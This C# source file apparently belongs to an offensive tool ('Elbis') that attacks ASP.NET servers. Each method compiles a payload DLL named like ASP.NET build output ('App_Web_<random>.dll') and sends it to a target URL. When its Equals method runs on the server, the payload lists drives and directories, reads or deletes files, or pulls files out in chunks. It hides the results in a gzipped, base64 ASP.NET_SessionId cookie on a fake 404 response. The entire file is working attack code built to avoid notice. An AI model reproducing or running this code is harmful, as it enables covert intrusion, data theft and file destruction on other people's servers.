using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using System.Diagnostics;
using Microsoft.CSharp;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Net.Http;
using System.Net;
using Elbis.Features.Web;

namespace Elbis.Features.File
{
    public static class FileOpretions
    {
        public static string DriverListing(string url)
        {
            string originalText = "";
            string code = @"
            using System;
			using System.IO;
			using System.IO.Compression;
			using System.Text;
			using System.Web;
            using System.Linq;
			namespace N
			{
				internal class C
				{
					private static byte[] M()
					{
							try
							{                                     
                                    DriveInfo[] allDrives = DriveInfo.GetDrives();
                                    C.result = string.Join(""; "", allDrives.Select(drive => drive.Name));
							}
							catch (Exception ex)
							{
								C.result += string.Format(""exception: {0}\n"", ex.Message);
							}
						byte[] array3 = new byte[0];
						try
						{
							byte[] bytes = Encoding.UTF8.GetBytes(C.result);
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
								{
									gzipStream.Write(bytes, 0, bytes.Length);
								}
								array3 = memoryStream.ToArray();
							}
						}
						catch
						{
						}
						return array3;
					}

					public override bool Equals(object obj)
					{
						try
						{
							HttpResponse response = HttpContext.Current.Response;
							response.Cookies[""ASP.NET_SessionId""].Value = Convert.ToBase64String(C.M());
							response.StatusCode = 404;
							response.Clear();
						}
						catch
						{
						}
						return true;
					}
					private static string result = """";
				}
			}
			";
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            string randomString = new string(Enumerable.Repeat(chars, 8)
              .Select(s => s[random.Next(s.Length)]).ToArray());
            string filename = "App_Web_" + randomString.ToLower() + ".dll";
            Assembly assembly = Assembly.GetExecutingAssembly();
            string assemblyLocation = assembly.Location;
            string filePath = System.IO.Path.GetDirectoryName(assemblyLocation) + "\\" + filename;
            CompilerParameters parms = new CompilerParameters
            {
                GenerateExecutable = false,
                GenerateInMemory = false,
                IncludeDebugInformation = false,
                OutputAssembly = filePath
            };
            parms.ReferencedAssemblies.Add("System.dll");
            parms.ReferencedAssemblies.Add("System.IO.dll");
            parms.ReferencedAssemblies.Add("System.IO.Compression.dll");
            parms.ReferencedAssemblies.Add("System.Web.dll");
            parms.ReferencedAssemblies.Add("System.Core.dll");
            CodeDomProvider compiler = CSharpCodeProvider.CreateProvider("CSharp");
            CompilerResults results = compiler.CompileAssemblyFromSource(parms, code);
            if (results.Errors.HasErrors)
            {
                string errorexp = "";
                foreach (CompilerError error in results.Errors)
                {
                    errorexp = error.ErrorText + Environment.NewLine;
                }
                MessageBox.Show(errorexp);
            }
            originalText = Request.ElbisRequest(url, filePath);
            return originalText;
        }

        public static string DirectoryListing(string url, string directoryPath)
        {
            string response = "";
            try
            {
                string code = @"
            using System;
			using System.IO;
			using System.IO.Compression;
			using System.Text;
            using System.Linq;
			using System.Web;
			namespace N
			{
				internal class C
				{
					private static byte[] M()
					{
						string filePath =	@""#directoryPathText#"";

							try
							{
								string[] directoryArray = Directory.GetDirectories(filePath);
								string directory = string.Join(""#directoryElbis#;"", directoryArray.Select(c => Path.GetFileName(c))) + ""#directoryElbis#;"";
								string[] fileArray = Directory.GetFiles(filePath);
								string files = string.Join(""#FileNameElbis#;"", fileArray.Select(c => Path.GetFileName(c))) + ""#FileNameElbis#;"";
								C.result = directory+files;
							}
							catch (Exception ex)
							{
								C.result=""Error"";
							}
						byte[] array3 = new byte[0];
						try
						{
							byte[] bytes = Encoding.UTF8.GetBytes(C.result);
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
								{
									gzipStream.Write(bytes, 0, bytes.Length);
								}
								array3 = memoryStream.ToArray();
							}
						}
						catch
						{
						}
						return array3;
					}

					public override bool Equals(object obj)
					{
						try
						{
							HttpResponse response = HttpContext.Current.Response;
							response.Cookies[""ASP.NET_SessionId""].Value = Convert.ToBase64String(C.M());
							response.StatusCode = 404;
							response.Clear();
						}
						catch
						{
						}
						return true;
					}
					private static string result = """";
				}
			}
			";
                code = code.Replace("#directoryPathText#", directoryPath);
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                Random random = new Random();
                string randomString = new string(Enumerable.Repeat(chars, 8)
                  .Select(s => s[random.Next(s.Length)]).ToArray());
                string filename = "App_Web_" + randomString.ToLower() + ".dll";
                Assembly assembly = Assembly.GetExecutingAssembly();
                string assemblyLocation = assembly.Location;
                string filePath = System.IO.Path.GetDirectoryName(assemblyLocation) + "\\" + filename;
                CompilerParameters parms = new CompilerParameters
                {
                    GenerateExecutable = false,
                    GenerateInMemory = false,
                    IncludeDebugInformation = false,
                    OutputAssembly = filePath
                };
                parms.ReferencedAssemblies.Add("System.dll");
                parms.ReferencedAssemblies.Add("System.IO.dll");
                parms.ReferencedAssemblies.Add("System.IO.Compression.dll");
                parms.ReferencedAssemblies.Add("System.Web.dll");
                parms.ReferencedAssemblies.Add("System.Core.dll");
                CodeDomProvider compiler = CSharpCodeProvider.CreateProvider("CSharp");
                CompilerResults results = compiler.CompileAssemblyFromSource(parms, code);
                if (results.Errors.HasErrors)
                {
                    string errorexp = "";
                    foreach (CompilerError error in results.Errors)
                    {
                        errorexp = error.ErrorText + Environment.NewLine;
                    }
                    MessageBox.Show(errorexp);
                }
                response = Request.ElbisRequest(url, filePath);
                return response;
            }
            catch (Exception)
            {
                return response;
            }
        }

        public static string FileInformation(string url, string filePathTxt)
        {
            string response = "";
            try
            {
                string code = @"
            using System;
			using System.IO;
			using System.IO.Compression;
			using System.Text;
            using System.Linq;
			using System.Web;
			namespace N
			{
				internal class C
				{
					private static byte[] M()
					{
						string filePath =	@""#filePathText#"";

							try
							{
								 if (File.Exists(filePath))
								 {
									C.result += ""File: "" + filePath + ""\n"";
									DateTime GetCreationTime = File.GetCreationTime(filePath);
									C.result += ""Creation Time: "" + GetCreationTime + ""\n"";
									DateTime GetLastAccessTime = File.GetLastAccessTime(filePath);
									C.result += ""Last Access Time Time: "" + GetLastAccessTime + ""\n"";
									DateTime GetLastWriteTime = File.GetLastWriteTime(filePath);
									C.result += ""Last Write Time: "" + GetLastWriteTime + ""\n"";
									long FileLength = new FileInfo(filePath).Length;
									C.result += ""File Length: "" + FileLength + ""\n"";
									int filepiece = (int)Math.Ceiling((double)FileLength / 40000);
									C.result += ""filepiece: "" + filepiece + ""\n"";

								}
							}
							catch (Exception ex)
							{
								C.result=""Error"";
							}
						byte[] array3 = new byte[0];
						try
						{
							byte[] bytes = Encoding.UTF8.GetBytes(C.result);
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
								{
									gzipStream.Write(bytes, 0, bytes.Length);
								}
								array3 = memoryStream.ToArray();
							}
						}
						catch
						{
						}
						return array3;
					}

					public override bool Equals(object obj)
					{
						try
						{
							HttpResponse response = HttpContext.Current.Response;
							response.Cookies[""ASP.NET_SessionId""].Value = Convert.ToBase64String(C.M());
							response.StatusCode = 404;
							response.Clear();
						}
						catch
						{
						}
						return true;
					}
					private static string result = """";
				}
			}
			";
                code = code.Replace("#filePathText#", filePathTxt);
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                Random random = new Random();
                string randomString = new string(Enumerable.Repeat(chars, 8)
                  .Select(s => s[random.Next(s.Length)]).ToArray());
                string filename = "App_Web_" + randomString.ToLower() + ".dll";
                Assembly assembly = Assembly.GetExecutingAssembly();
                string assemblyLocation = assembly.Location;
                string filePath = System.IO.Path.GetDirectoryName(assemblyLocation) + "\\" + filename;
                CompilerParameters parms = new CompilerParameters
                {
                    GenerateExecutable = false,
                    GenerateInMemory = false,
                    IncludeDebugInformation = false,
                    OutputAssembly = filePath
                };
                parms.ReferencedAssemblies.Add("System.dll");
                parms.ReferencedAssemblies.Add("System.IO.dll");
                parms.ReferencedAssemblies.Add("System.IO.Compression.dll");
                parms.ReferencedAssemblies.Add("System.Web.dll");
                parms.ReferencedAssemblies.Add("System.Core.dll");
                CodeDomProvider compiler = CSharpCodeProvider.CreateProvider("CSharp");
                CompilerResults results = compiler.CompileAssemblyFromSource(parms, code);
                if (results.Errors.HasErrors)
                {
                    string errorexp = "";
                    foreach (CompilerError error in results.Errors)
                    {
                        errorexp = error.ErrorText + Environment.NewLine;
                    }
                    MessageBox.Show(errorexp);
                }
                response = Request.ElbisRequest(url, filePath);
                return response;
            }
            catch (Exception)
            {
                return response;
            }
        }

        public static string FileRead(string url, string filePathTxt)
        {
            string response = "";

            try
            {
                string code = @"          
            using System;
			using System.IO;
			using System.IO.Compression;
			using System.Text;
			using System.Web;
			namespace N
			{
				internal class C
				{
					private static byte[] M()
					{
						string filePath = @""#filePathText#"";
                        try
                        {              
                            C.result = File.ReadAllText(filePath);

                        }
                        catch (Exception ex)
                        {
                            C.result = ex.Message;
                        }
						byte[] array3 = new byte[0];
						try
						{
							byte[] bytes = Encoding.UTF8.GetBytes(C.result);
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
								{
									gzipStream.Write(bytes, 0, bytes.Length);
								}
								array3 = memoryStream.ToArray();
							}
						}
						catch
						{
						}
						return array3;
					}

					public override bool Equals(object obj)
					{
						try
						{
							HttpResponse response = HttpContext.Current.Response;
							response.Cookies[""ASP.NET_SessionId""].Value = Convert.ToBase64String(C.M());
							response.StatusCode = 404;
							response.Clear();
						}
						catch
						{
						}
						return true;
					}
					private static string result = """";
				}
			}
			";
                code = code.Replace("#filePathText#", filePathTxt);
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                Random random = new Random();
                string randomString = new string(Enumerable.Repeat(chars, 8)
                  .Select(s => s[random.Next(s.Length)]).ToArray());
                string filename = "App_Web_" + randomString.ToLower() + ".dll";
                Assembly assembly = Assembly.GetExecutingAssembly();
                string assemblyLocation = assembly.Location;
                string filePath = System.IO.Path.GetDirectoryName(assemblyLocation) + "\\" + filename;
                CompilerParameters parms = new CompilerParameters
                {
                    GenerateExecutable = false,
                    GenerateInMemory = false,
                    IncludeDebugInformation = false,
                    OutputAssembly = filePath
                };
                parms.ReferencedAssemblies.Add("System.dll");
                parms.ReferencedAssemblies.Add("System.IO.dll");
                parms.ReferencedAssemblies.Add("System.IO.Compression.dll");
                parms.ReferencedAssemblies.Add("System.Web.dll");
                CodeDomProvider compiler = CSharpCodeProvider.CreateProvider("CSharp");
                CompilerResults results = compiler.CompileAssemblyFromSource(parms, code);
                if (results.Errors.HasErrors)
                {
                    string errorexp = "";
                    foreach (CompilerError error in results.Errors)
                    {
                        errorexp = error.ErrorText + Environment.NewLine;
                    }
                }
                response = Request.ElbisRequest(url, filePath);
                return response;
            }
            catch (Exception)
            {
                return response;
            }
        }

        public static string FileDelete(string url, string filePathTxt)
        {
            string response = "";

            try
            {
                string code = @"          
            using System;
			using System.IO;
			using System.IO.Compression;
			using System.Text;
			using System.Web;
			namespace N
			{
				internal class C
				{
					private static byte[] M()
					{
						string filePath = @""#filePathText#"";
                        try
                        {    
                            File.Delete(filePath);
           
                            C.result = ""Deletion Successful"";

                        }
                        catch (Exception ex)
                        {
                            C.result = ex.Message;
                        }
						byte[] array3 = new byte[0];
						try
						{
							byte[] bytes = Encoding.UTF8.GetBytes(C.result);
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
								{
									gzipStream.Write(bytes, 0, bytes.Length);
								}
								array3 = memoryStream.ToArray();
							}
						}
						catch
						{
						}
						return array3;
					}

					public override bool Equals(object obj)
					{
						try
						{
							HttpResponse response = HttpContext.Current.Response;
							response.Cookies[""ASP.NET_SessionId""].Value = Convert.ToBase64String(C.M());
							response.StatusCode = 404;
							response.Clear();
						}
						catch
						{
						}
						return true;
					}
					private static string result = """";
				}
			}
			";
                code = code.Replace("#filePathText#", filePathTxt);
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                Random random = new Random();
                string randomString = new string(Enumerable.Repeat(chars, 8)
                  .Select(s => s[random.Next(s.Length)]).ToArray());
                string filename = "App_Web_" + randomString.ToLower() + ".dll";
                Assembly assembly = Assembly.GetExecutingAssembly();
                string assemblyLocation = assembly.Location;
                string filePath = System.IO.Path.GetDirectoryName(assemblyLocation) + "\\" + filename;
                CompilerParameters parms = new CompilerParameters
                {
                    GenerateExecutable = false,
                    GenerateInMemory = false,
                    IncludeDebugInformation = false,
                    OutputAssembly = filePath
                };
                parms.ReferencedAssemblies.Add("System.dll");
                parms.ReferencedAssemblies.Add("System.IO.dll");
                parms.ReferencedAssemblies.Add("System.IO.Compression.dll");
                parms.ReferencedAssemblies.Add("System.Web.dll");
                CodeDomProvider compiler = CSharpCodeProvider.CreateProvider("CSharp");
                CompilerResults results = compiler.CompileAssemblyFromSource(parms, code);
                if (results.Errors.HasErrors)
                {
                    string errorexp = "";
                    foreach (CompilerError error in results.Errors)
                    {
                        errorexp = error.ErrorText + Environment.NewLine;
                    }
                }
                response = Request.ElbisRequest(url, filePath);
                return response;
            }
            catch (Exception)
            {
                return response;
            }
        }

        public static string FileDownload(string url, string filePathTxt,int chunkNumber)
        {
            string response = "";

            try
            {
                string code = @"          
            using System;
			using System.IO;
			using System.IO.Compression;
			using System.Text;
			using System.Web;
			namespace N
			{
				internal class C
				{
					private static byte[] M()
					{
						string filePath = @""#filePathText#"";
						int chunkNumber = #chunkNumber#;
                        try
                        {  
							int chunkSize = 40000;
							long fileSize = new FileInfo(filePath).Length;
							int chunkCount = (int)Math.Ceiling((double)fileSize / chunkSize);
							if (chunkNumber < 1 || chunkNumber > chunkCount)
							{
								C.result =""Complate"";
							}
							else
							{
							if(chunkNumber != chunkCount)
							{
                            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
							{
								byte[] buffer = new byte[chunkSize]; 
								long position = (chunkNumber - 1) * chunkSize;
								fileStream.Seek(position, SeekOrigin.Begin);
								int bytesRead = fileStream.Read(buffer, 0, buffer.Length);
								if (bytesRead > 0)
								{
									C.result = Convert.ToBase64String(buffer);
									
								}
								else
								{
									C.result =""Complate"";
								}
							}
							}
							else
							{
							using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
							{								
								long position = (chunkNumber - 1) * chunkSize;
								int buffersize = (int)Math.Ceiling((double)fileSize - position);
								byte[] buffer = new byte[buffersize]; 
								fileStream.Seek(position, SeekOrigin.Begin);
								int bytesRead = fileStream.Read(buffer, 0, buffer.Length);
								if (bytesRead > 0)
								{
									C.result = Convert.ToBase64String(buffer);
								}
								else
								{
									C.result =""Complate"";
								}
							}
							}
							}
                        }
                        catch (Exception ex)
                        {
                            C.result = ex.Message;
                        }
						byte[] array3 = new byte[0];
						try
						{
							byte[] bytes = Encoding.UTF8.GetBytes(C.result);
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
								{
									gzipStream.Write(bytes, 0, bytes.Length);
								}
								array3 = memoryStream.ToArray();
							}
						}
						catch (Exception ex)
						{
							C.result = ex.Message;
						}
						return array3;
					}

					public override bool Equals(object obj)
					{
						try
						{
							HttpResponse response = HttpContext.Current.Response;
							response.Cookies[""ASP.NET_SessionId""].Value = Convert.ToBase64String(C.M());
							response.StatusCode = 404;
							response.Clear();
						}
						catch
						{
						}
						return true;
					}
					private static string result = """";
				}
			}
			";
                code = code.Replace("#filePathText#", filePathTxt);
                code = code.Replace("#chunkNumber#", chunkNumber.ToString());
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                Random random = new Random();
                string randomString = new string(Enumerable.Repeat(chars, 8)
                  .Select(s => s[random.Next(s.Length)]).ToArray());
                string filename = "App_Web_" + randomString.ToLower() + ".dll";
                Assembly assembly = Assembly.GetExecutingAssembly();
                string assemblyLocation = assembly.Location;
                string filePath = System.IO.Path.GetDirectoryName(assemblyLocation) + "\\" + filename;
                CompilerParameters parms = new CompilerParameters
                {
                    GenerateExecutable = false,
                    GenerateInMemory = false,
                    IncludeDebugInformation = false,
                    OutputAssembly = filePath
                };
                parms.ReferencedAssemblies.Add("System.dll");
                parms.ReferencedAssemblies.Add("System.IO.dll");
                parms.ReferencedAssemblies.Add("System.IO.Compression.dll");
                parms.ReferencedAssemblies.Add("System.Web.dll");
                CodeDomProvider compiler = CSharpCodeProvider.CreateProvider("CSharp");
                CompilerResults results = compiler.CompileAssemblyFromSource(parms, code);
                if (results.Errors.HasErrors)
                {
                    string errorexp = "";
                    foreach (CompilerError error in results.Errors)
                    {
                        errorexp = error.ErrorText + Environment.NewLine;
                    }
                }
                response = Request.ElbisRequest(url, filePath);
                return response;
            }
            catch (Exception)
            {
                return response;
            }
        }


    }
}
